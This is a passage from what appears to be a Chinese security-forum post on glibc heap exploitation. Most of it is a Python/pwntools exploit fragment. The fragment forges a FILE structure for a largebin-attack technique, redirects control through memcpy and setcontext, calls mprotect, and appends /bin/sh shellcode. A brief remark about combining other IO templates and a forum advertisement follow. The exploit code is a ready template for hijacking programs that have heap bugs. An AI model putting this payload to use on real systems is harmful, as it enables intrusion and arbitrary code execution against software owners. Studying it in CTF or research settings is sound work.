
```python
# largebin_attack 攻击 house_魑魅魍魉
# 模拟只有一次写入，payload 必须在前面写入
# 为确保正确执行，需要利用 COMPILE_WPRINTF==1 的模式
fake_io_addr = heap_addr + 0x1390
put_stream_offset = 0x30
# put_stream 距离 fake_io 的偏移
put_stream_addr = fake_io_addr + put_stream_offset
write_target_addr = memcpy_addr
target_value_offset = 0x200
# 需要执行的函数存储的地址距离 fake_io 的偏移
target_value_addr = fake_io_addr + target_value_offset
IO_wide_data_addr = fake_io_addr + 0xe0 # len(IO_IFLE) 利用原有的宽字符
# 再一次执行到 memcpy时rdi的地址
rdi_offset = 0xf
# 因为 _IO_write_ptr 会加1，此处确保内存对齐
rdi_ucontext_addr = target_value_addr + rdi_offset
# more_len > count_len > 0x20 可以再次执行 memcpy
more_len = 0x80 * 8
# 为什么 IO_help_jump_0_ 里面还要在右边移位2位？？
count_len = 0x28 # 要大于0x20
_flags = 0x400 # _flags == 0x400 执行 fp->_IO_write_ptr = fp->_IO_read_ptr;
fake_io_file = b""
fake_io_file = fake_io_file.ljust(0x20, b'\x00')
fake_io_file += p64(_flags) # 此处是 put_stream 起始地址; _flags == 0x400 执行 fp->_IO_write_ptr = fp->_IO_read_ptr;
fake_io_file += p64(rdi_ucontext_addr)
fake_io_file += p64(0) * 2
fake_io_file += p64(write_target_addr - 0x20)
fake_io_file += p64(write_target_addr)
fake_io_file += p64(write_target_addr + count_len)
fake_io_file += p64(0)
# 用于绕过  if (pos >= (size_t) (_IO_blen (fp) + flush_only)) 不执行malloc
fake_io_file += p64((1 << 64) - 1)
fake_io_file += p64(0) * 2
fake_io_file += p64(heap_addr+0x2000) #可写
fake_io_file += p64(0) * 2
fake_io_file += p64(IO_wide_data_addr)
fake_io_file = fake_io_file.ljust(0xc8, b'\x00')
fake_io_file += p64(IO_help_jump_0_addr)
fake_io_file += p64(0)
fake_io_file += p64(heap_addr+0x2000) #可写
fake_io_file += p64(0)
fake_io_file += p64(target_value_addr)
fake_io_file += p64(target_value_addr + more_len)
fake_io_file += p64(IO_str_jumps_addr)
fake_io_file = fake_io_file.ljust(0x1b8, b'\x00')
fake_io_file += p64(put_stream_addr)
fake_io_file = fake_io_file.ljust(target_value_offset - 0x10, b"\x00") # largbin_attak 时需要 - 0x10
# 需要执行的函数是 setcontext，距离 fake_io 的偏移为 target_value_offset
fake_io_file += p64(setcontext_addr) + p64(0) # 此段长度为 0x10 与 rdi_offset 对应
ucontext = b""
ucontext += p64(0) * 13
mprotect_len = 0x20000
tcache_thead_size = 0x290
__rdi = heap_addr # heap_addr binsh_addr
__rsi = mprotect_len
__rbp = heap_addr + mprotect_len
__rbx = 0
__rdx = 7
__rcx = 0
__rax = 0
# heap_addr + tcache_thead_size + 0x10000  # systm 栈帧务必要足够长
# 0x2e8 下面的  print("payload len is",hex(len(payload)))
# largbin_attak 时需要 + 0x10
__rsp = fake_io_addr + 0x2e8 + 0x10
__rip = mprotect_addr #execve_addr #mprotect_addr
ucontext += p64(__rdi)
ucontext += p64(__rsi)
ucontext += p64(__rbp)
ucontext += p64(__rbx)
ucontext += p64(__rdx)
ucontext += p64(__rcx)
ucontext += p64(__rax)
ucontext += p64(__rsp)
ucontext += p64(__rip)
ucontext = ucontext.ljust(0xe0, b'\x00')
ucontext += p64(heap_addr+0x6000) # fldenv [rcx]  加载浮点环境，需要可写
payload = fake_io_file + ucontext
print("payload len is", hex(len(payload))) # 0x2e8 与__rsp相呼应
shellcode = asm(shellcraft.sh())
payload += p64(fake_io_addr + len(payload) + 0x8 + 0x10) # largbin_attak 时需要 + 0x10
payload += bytes(shellcode)
```

## 3.其他

同理，其他IO板子绝大部分都能够与`house_of_一骑当千`配合使用，一通百通，就不再赘述。

[\[招生\]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2023-3-26 20:01 被我超啊编辑，原因： 错字

[#漏洞机制](https://bbs.kanxue.com/forum-171-1-181.htm)  
[#专题](https://bbs.kanxue.com/forum-171-1-186.htm)

上传的附件：

- [vpn.zip](javascript:void(0);)（58.18kb，22次下载）
